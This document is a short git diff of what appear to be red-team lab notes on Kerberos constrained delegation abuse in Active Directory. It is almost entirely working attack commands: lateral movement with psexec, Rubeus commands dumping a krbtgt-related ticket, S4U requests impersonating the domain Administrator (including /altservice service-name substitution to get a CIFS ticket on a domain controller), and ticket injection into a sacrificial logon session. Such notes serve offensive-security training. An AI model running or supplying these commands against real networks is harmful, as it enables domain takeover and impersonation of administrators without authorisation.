@@ -23,14 +23,21 @@ jump psexec64 lon-ws-1 smb
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
 ```
 
-Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value, impersonating the default domain admin. `/altservice` too
+
+> Couple options here: 
+
+1.  Perform the S4U abuse to obtain a usable service ticket using service name substitution
+
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
-
-----------------------------------/altservice------------------------------------
-
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
 ```
+
+2. Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value,
+
+```powershell
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1 /impersonateuser:Administrator /nowrap /ticket:
+```
+
 
  Inject the ticket into a sacrificial logon session.
 ```powershell
